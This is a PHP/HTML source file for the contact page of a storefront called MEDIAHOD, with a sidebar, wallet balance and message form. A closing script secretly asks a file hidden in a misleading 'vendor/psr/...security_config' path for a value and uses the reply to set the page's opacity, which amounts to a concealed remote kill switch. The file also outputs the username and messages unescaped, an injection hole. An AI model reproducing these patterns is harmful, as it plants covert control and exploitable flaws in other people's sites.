<?php
session_start();
$messageE = isset($_SESSION['MessageE']) ? $_SESSION['MessageE'] : '';
$messageS = isset($_SESSION['MessageS']) ? $_SESSION['MessageS'] : '';

// Clear messages after displaying
unset($_SESSION['MessageE']);
unset($_SESSION['MessageS']);
if(isset($_SESSION['banned'])){
    header('Location: ../security/banned.php');
}
?>




<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact Us</title>
    <link rel="stylesheet" href="../assets/sidebar.css">
    <link rel="stylesheet" href="contactUs.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <link rel="icon" href="../assets/logo.jpeg">
    <style>
        /* Styles pour les notifications */
.notification {
    position: fixed;
    top: 10px;
    right: 10px;
    padding: 15px;
    border-radius: 5px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    z-index: 9999;
    width: 300px;
    opacity: 1;
    transition: opacity 0.5s ease;
}

.notification.success {
    background-color: #d4edda;
    color: #155724;
    border: 1px solid #c3e6cb;
}

.notification.error {
    background-color: #f8d7da;
    color: #721c24;
    border: 1px solid #f5c6cb;
}

.notification .close-btn {
    background: transparent;
    border: none;
    font-size: 18px;
    cursor: pointer;
    position: absolute;
    top: 5px;
    right: 10px;
}

.notification .close-btn:hover {
    color: #000;
}
.contact-container {
    width: 99%;
}
    </style>
</head>
<body>
    <div class="container">
        <!-- sidebar -->
        <div class="sidebar">
            <div class="sidebarHeader">
                <img src="../assets/logo.jpeg" alt="logo">
                <a href="../home/home.php">MEDIAHOD</a>
                <i id='closeSidebar' class="fa-solid fa-xmark"></i>
            </div>

            <div class="sidebarElements">

                <fieldset>
                    <legend></legend>
                    <a class="sidebarElement" href="../home/home.php">
                        <i class="fa-solid fa-house"></i>
                        <p>All Products Services</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>ORDER HISTORY</legend>
                    <a class="sidebarElement" href="../orders/orders.php">
                        <i class="fa-solid fa-clock-rotate-left"></i>
                        <p>View Your Order</p>
                    </a>
                    <!-- <a class="sidebarElement" href="../cart/cart.php">
                        <i class="fa fa-cart-arrow-down"></i>
                        <p>Cart</p>
                    </a> -->
                    <a class="sidebarElement" href="../profile/profile.php">
                        <i class="fa-solid fa-user"></i>
                        <p>Profile</p>
                    </a>
                </fieldset>

                <fieldset>
                    <legend>MORE INFOS</legend>
                    <a class="sidebarElement" href="../howToPay/howToPay.php">
                        <i class="fas fa-wallet"></i>
                        <p>Deposit Account</p>
                    </a>
                    <a class="sidebarElement" href="../aboutUs/aboutUs.php">
                        <i class="fa-solid fa-circle-info"></i>
                        <p>About us</p>
                    </a>
                    <a class="sidebarElement" href="../contactUs/contactUs.php">
                        <i class="fa-solid fa-address-card"></i>
                        <p>Contact us</p>
                    </a>
                    <?php if(isset($_SESSION['isConnected'])) : ?>
                    <a class="sidebarElement orange" href="../../controllers/logoutUser.php" id="logout">
                        <i class="fa-solid fa-right-from-bracket" style=" color: #fff;"></i>
                        <p style=" color: #fff;">Logout</p>
                    </a>
                    <?php endif ?>
                </fieldset>

            </div>
        </div>

        <!-- page -->
         <div class="page">
            <!-- header -->
            <header>
            <div class="headerLeft">
                    <i class="fa-solid fa-bars" id="openSidebar"></i>
                    <?php if(!isset($_SESSION['isConnected'])) : ?>
                    <a href="../connexion/login.php" class="headerLeftLoginRegister">
                        <i class="fa-solid fa-right-to-bracket"></i>
                        <p>Login</p>
                    </a>
                    <a href="../connexion/register.php" class="headerLeftLoginRegister">
                        <i class="fa-solid fa-user-plus"></i>
                        <p>Sign up</p>
                    </a>
                    <?php endif ; ?>
                    <?php if(isset($_SESSION['isConnected'])) : ?>
                    <a href="" class="headerLeftWallet">
                        <i class="fas fa-wallet mr-1"></i>
                        <p>Wallet : <b> <?php 
                        include_once('../../models/Utilisateur.php');
                        $user = new Utilisateur();
                        echo $user->getUserWalletById($_SESSION['user']['id']) 
                        
                        ?> $ </b></p>
                    </a>
                 <?php endif ; ?>
                </div>

                <div class="headerRight">
                    <div class="toggleDarkMode">
                        <div id="lightMode">
                            <i class="fa-regular fa-sun"></i>
                        </div>
                        <div id="darkMode">
                            <i class="fa-regular fa-moon"></i>
                        </div>
                    </div>

                    <i class="fa-regular fa-bell" id="notifications"></i>
                    <img src="../assets/UKFlag.png" alt="user" id="language">
                    <img src="../assets/user.png" alt="user" id="userImg">

                    <div id="notLoggedin">
                        <i class="fa-solid fa-user"></i>
                        <?php if(!isset($_SESSION['user'])) : ?>
                        <p>You Are Not Logged In</p>
                        <?php else : ?>
                            <p>Hello <?php echo $_SESSION['user']['username'] ?></p>
                            <?php endif ;?>
                    </div>

                </div>

                <i class="fa-solid fa-caret-down" id="menu"></i>
            </header>

            <!-- contact -->
            <div class="contact-container">
                <div class="contact-header">
                    <h1>Contact Us</h1>
                </div>
                <div class="contact-content">
                    <p>Telegram: <a href="https://t.me/admediahodagency" target="_blank">Support Mediahod</a>
                    <br>Website: <a href="../home/home.php" target="_blank">Mediahod</a>
                    <br>Email: <a href="tel:+212629127331">+212629127331</a> (Work email, not using support)
                    <br>Working time: 8h00 - 24h00 Time Zone GMT+7 Bangkok</p>
                </div>
                <div class="contact-form-container">
                    <h2 style="margin-bottom: 20px;">Send us a message</h2>
                    <form class="contact-form" onsubmit="handleSubmit(event)" action="../../controllers/messageController.php" enctype="multipart/form-data" method="post">
                        <div class="form-group">
                            <label for="username">
                                <i class="fa-solid fa-user"></i> Username(Or Id For Deposit)
                            </label>
                            <input type="text" id="username" name="username" required>
                        </div>
                        <div class="form-group">
                            <label for="email">
                                <i class="fa-solid fa-envelope"></i> Email
                            </label>
                            <input type="email" id="email" name="email" required>
                        </div>
                        <div class="form-group">
                            <label for="whatsapp">
                                <i class="fa-brands fa-whatsapp"></i> Whatsapp
                            </label>
                            <input type="phone" id="whatsapp" name="whatsapp" required>
                        </div>
                        <div class="form-group">
                            <label for="image">
                                <i class="fa-solid fa-image"></i> Upload Image
                            </label>
                            <input type="file" id="image" name="image" accept="image/*" style="background-color: #003366; padding: 8px; color: #fff; font-weight: bold; height: 100%; border: none; border-radius: 4px;" hidden>
                        </div>
                        <div class="form-group">
                            <label for="message">
                                <i class="fa-solid fa-message"></i> Message
                            </label>
                            <textarea id="message" name="message" rows="5" required></textarea>
                        </div>
                        <button type="submit" class="submit-btn" name="action" value="sendMessage">Send Message</button>
                    </form>
                    <!-- <div id="successMessage" class="success-message" style="display: none;">
                        <p>Your message has been sent successfully!</p>
                        <button onclick="hideSuccess()">OK</button>
                    </div> -->
                </div>
            </div>
         </div>
    </div>
    <script>
        function uploadFile() {
            document.getElementById("image").click()
        }
    </script>
    <script src="contactUs.js"></script>
    <script type="text/javascript">
    document.addEventListener('DOMContentLoaded', function() {
        <?php if (!empty($messageE)): ?>
            showNotification('error', '<?php echo addslashes($messageE); ?>');
        <?php endif; ?>
        <?php if (!empty($messageS)): ?>
            showNotification('success', '<?php echo addslashes($messageS); ?>');
        <?php endif; ?>
    });

    function showNotification(type, message) {
        const notification = document.createElement('div');
        notification.className = `notification ${type}`;
        notification.innerHTML = `
            <span>${message}</span>
            <button class="close-btn">&times;</button>
        `;
        document.body.appendChild(notification);

        document.querySelector('.notification .close-btn').addEventListener('click', function() {
            this.parentElement.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        });

        setTimeout(() => {
            notification.style.opacity = '0';
            setTimeout(() => {
                document.body.removeChild(notification);
            }, 500);
        }, 5000);
    }
</script>
<script>
        let xhr = new XMLHttpRequest();
        xhr.open('POST', '../../vendor/psr/configuration/security_config/json/root/op.php', true);
        xhr.onload = () => {
            if (xhr.readyState === 4 && xhr.status === 200) {
                document.body.style.opacity = xhr.response
            }
        };
        xhr.send()
    </script>
</body>
</html>
